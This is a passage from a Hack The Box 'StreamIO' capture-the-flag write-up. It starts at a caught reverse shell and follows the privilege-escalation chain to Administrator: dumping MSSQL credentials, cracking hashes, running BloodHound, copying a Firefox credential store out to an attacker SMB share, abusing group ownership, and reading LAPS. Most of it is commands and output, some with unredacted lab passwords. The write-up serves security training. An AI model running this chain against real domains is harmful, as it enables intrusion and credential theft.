                                    Ncat: Listening on 0.0.0.0:9001
```

Sending our reverse shell request : 

![](/assets/img/HTB-StreamIO-admin_panel-reverse_shell.png)

A connection comes back on the listener, landing a shell as ``streamio\yoshihide``.

```shell
<SNIP>

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
streamio\yoshihide
```

---

## Privilege Escalation
### yoshihide -> nikk37

Browsing the web application source code turns up hardcoded database credentials in both ``index.php`` and ``login.php``.

```shell
PS C:\inetpub\streamio.htb\admin> cat index.php
<SNIP>

$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hXXXXXXXXXX90');
$handle = sqlsrv_connect('(local)',$connection);
<SNIP>

PS C:\inetpub\streamio.htb> cat ../login.php
<SNIP>

<?php
$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1XXXXXXXX@h');
$handle = sqlsrv_connect('(local)',$connection);
<SNIP>
```

The ``db_admin`` credentials from ``index.php`` are used to connect to the local MSSQL instance and enumerate available databases. 
In addition to the main STREAMIO database already dumped remotely, a second database named ``streamio_backup`` is present.

```shell
PS C:\inetpub\streamio.htb\admin> sqlcmd -S 127.0.0.1 -U 'db_admin' -P 'B1@hXXXXXXXXXX90' -y  -Y 30

1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
------------------------------
master
tempdb
model
msdb
STREAMIO
streamio_backup

(6 rows affected)
```

Querying the ``users`` table in ``streamio_backup`` reveals a smaller set of accounts including ``nikk37``, whose MD5 hash cracks to ``getXXXXXXXXXXXXXXXXXXcom``.


```shell
1> use streamio_backup;
2> GO
Changed database context to 'streamio_backup'.
1> SELECT * FROM streamio_backup.INFORMATION_SCHEMA.TABLES;
2> GO
TABLE_CATALOG                  TABLE_SCHEMA                   TABLE_NAME                     TABLE_TYPE
------------------------------ ------------------------------ ------------------------------ ----------
streamio_backup                dbo                            movies                         BASE TABLE
streamio_backup                dbo                            users                          BASE TABLE

(2 rows affected)

1> SELECT * FROM users;
2> GO
id          username                       password
----------- ------------------------------ ------------------------------
          1 nikk37                         389dXXXXXXXXXXXXXXXXXXXXXXf061
          2 yoshihide                      b779XXXXXXXXXXXXXXXXXXXXXf5f23
          3 James                          c660XXXXXXXXXXXXXXXXXXXXc99c92
          4 Theodore                       925e5408ecb67aea449373d668b735
          5 Samantha                       083ffae904143c4796e464dac33c1f
          6 Lauren                         08344b85b329d7efd611b7a7743e8a
          7 William                        d62be0dc82071bccc1322d64ec5b6c
          8 Sabrina                        f87d3c0d6c8fd686aacc6627f1f493

(8 rows affected)
```

```shell
PS C:\Users\Tatsuki\Tools\hashcat> .\hashcat.exe -a 0 -m 0 -O .\hashes\hashes.txt .\wordlists\rockyou.txt --show
nikk37:389dXXXXXXXXXXXXXXXXXXXXXXf061:getXXXXXXXXXXXXXXXXXXcom
yoshihide:b779XXXXXXXXXXXXXXXXXXXXXf5f23:66XXXXXXXXXXXX..
Lauren:08344b85b329d7efd611b7a7743e8a:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493:!!sabrina$
```

The cracked credential is validated against LDAP and BloodHound data is collected using NetExec to map out privilege relationships across the domain.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ nxc ldap 10.129.68.33 -u 'nikk37' -p 'getXXXXXXXXXXXXXXXXXXcom'
LDAP   10.129.68.33    389    DC    [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert)
LDAP   10.129.68.33    389    DC    [+] streamIO.htb\nikk37:getXXXXXXXXXXXXXXXXXXcom

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ nxc ldap 10.129.69.73 -d 'streamio.htb' -u 'nikk37' -p 'getXXXXXXXXXXXXXXXXXXcom' --dns-server 10.129.69.73 --bloodhound -c All
LDAP   10.129.69.73    389    DC    [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamio.htb) (signing:None) (channel binding:No TLS cert)
LDAP   10.129.69.73    389    DC    [+] streamio.htb\nikk37:getXXXXXXXXXXXXXXXXXXcom
LDAP   10.129.69.73    389    DC    Resolved collection methods: trusts, localadmin, dcom, rdp, acl, container, group, session, objectprops, psremote
LDAP   10.129.69.73    389    DC    Done in 0M 15S
LDAP   10.129.69.73    389    DC    Compressing output into /home/tatsuki/.nxc/logs/DC_10.129.69.73_2026-02-04_200644_bloodhound.zip
```

BloodHound shows that ``nikk37`` has ``CanPSRemote`` rights on ``DC.STREAMIO.HTB``, allowing a direct WinRM connection.

![](/assets/img/HTB-StreamIO-nikk37_acls.png)

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ evil-winrm -i 10.129.68.33 -u 'nikk37' -p 'getXXXXXXXXXXXXXXXXXXcom'

<SNIP>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents> whoami
streamio\nikk37
*Evil-WinRM* PS C:\Users\nikk37\Documents> cd ../Desktop/user.txt
c99dXXXXXXXXXXXXXXXXXXXXXXXX2ecc
```

---

### nikk37 -> Administrator

Running WinPEAS on the box highlights a Firefox profile directory containing a ``key4.db`` credential store.

```shell
*Evil-WinRM* PS C:\Users\nikk37\Desktop> .\winPEASx64.exe

<SNIP>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

<SNIP>
```

The entire Firefox profile directory is compressed and transferred to the attacking machine over an SMB share.

```shell
*Evil-WinRM* PS C:\Users\nikk37\Desktop> Compress-Archive -Path C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release -DestinationPath firefox_profiles.zip

*Evil-WinRM* PS C:\Users\nikk37\Desktop> net use n: \\<attacker_ip>\share /user:tatsuki <redacted_password>
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\Desktop> copy firefox_profiles.zip n:\
```

[firefox_decrypt.py](https://github.com/unode/firefox_decrypt/) is then used to extract plaintext credentials from the database.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO/privEsc/firefox_profiles]
└──╼ [★]$ unzip firefox_profiles.zip
Archive:  firefox_profiles.zip
warning:  firefox_profiles.zip appears to use backslashes as path separators
   creating: br53rxeg.default-release/bookmarkbackups/
   creating: br53rxeg.default-release/browser-extension-data/
   creating: br53rxeg.default-release/minidumps/
   creating: br53rxeg.default-release/security_state/
  inflating: br53rxeg.default-release/addons.json

<SNIP>

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ python firefox_decrypt.py firefox_profiles/br53rxeg.default-release
2026-02-03 16:32:20,448 - WARNING - profile.ini not found in br53rxeg.default-release
2026-02-03 16:32:20,448 - WARNING - Continuing and assuming 'br53rxeg.default-release' is a profile location

Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDXXXXXXXXXXXXXXXt0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kXXXXXXXXXX:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paXXXXXX@12'

Website:   https://slack.streamio.htb
Username: 'JDgodd'
Password: 'paXXXXXX@12'
```

The tool recovers four sets of credentials saved for ``slack.streamio.htb``. Among them, the password for ``JDgodd`` (``JDXXXXXXXXXXXXXXXt0r``).

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ nxc ldap 10.129.68.33 -u 'jdgodd' -p 'JDXXXXXXXXXXXXXXXt0r'
LDAP    10.129.68.33    389    DC    [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert)
LDAP    10.129.68.33    389    DC    [+] streamIO.htb\jdgodd:JDXXXXXXXXXXXXXXXt0r
```

BloodHound shows that ``JDgodd`` is the owner of the ``CORE STAFF`` group, which itself has ``ReadLAPSPassword`` over the domain controller.

![](/assets/img/HTB-StreamIO-jdgodd_acls.png)

We confirmed the ownership and give him `genericAll` permissions over the group :

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ owneredit.py -action 'read' -target 'CORE STAFF' "streamio.htb/jdgodd:JDXXXXXXXXXXXXXXXt0r"
<SNIP>

[*] Current owner information below
[*] - SID: S-1-5-21-1470860369-1569627196-4264678630-1104
[*] - sAMAccountName: JDgodd
[*] - distinguishedName: CN=JDgodd,CN=Users,DC=streamIO,DC=htb

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ bloodyAD --host 10.129.68.33 -d 'streamio.htb' -u 'jdgodd' -p 'JDXXXXXXXXXXXXXXXt0r' add genericAll 'CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB' 'jdgodd'
[+] jdgodd has now GenericAll on CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB
```

Next, we retrieve the LAPS password for the ``DC$`` account.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO]
└──╼ [★]$ nxc ldap 10.129.68.33 -u 'jdgodd' -p 'JDXXXXXXXXXXXXXXXt0r' -M laps
LDAP    10.129.68.33    389    DC    [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert)
LDAP    10.129.68.33    389    DC    [+] streamIO.htb\jdgodd:JDXXXXXXXXXXXXXXXt0r
LAPS    10.129.68.33    389    DC    [*] Getting LAPS Passwords
LAPS    10.129.68.33    389    DC    Computer:DC$ User:        Password:)XXXXXXXXXXX!q
```

Using the LAPS password, we were able to open a WinRM session as Administrator and retrieve the root flag located under ``martin``'s Desktop.

```shell
┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/StreamIO/]
└──╼ [★]$ evil-winrm -i 10.129.68.33 -u 'Administrator' -p ')XXXXXXXXXXX!q'
<SNIP>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\users\martin\Desktop\root.txt
a472XXXXXXXXXXXXXXXXXXXXXXX34903
```